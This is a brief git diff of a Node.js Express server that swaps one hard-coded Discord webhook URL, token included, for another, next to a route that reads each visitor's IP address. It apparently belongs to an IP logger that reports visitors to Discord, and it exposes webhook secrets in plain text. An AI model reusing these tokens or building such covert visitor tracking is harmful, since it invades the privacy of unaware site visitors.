@@ -4,7 +4,7 @@ const fetch = require('node-fetch');
 
 const app = express();
 const port = process.env.PORT || 3000;
-const webhook = new Webhook('https://discord.com/api/webhooks/1086852248031727747/KUIk8cpIiF4qDpIASn7UTirGKUu_gHpmEjrPYuuN84OpKOY8Rl4sg34Zm4hvwbmvKYw-');
+const webhook = new Webhook('https://discord.com/api/webhooks/1086892846587580486/eEcvojWArjqxAoMeG7hQUlEPfJpjxlbFB8q2fgXhRI4LrRTlDuGclfPWrwNlMWi-lF3A');
 
 app.get('/', async (req, res) => {
   const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
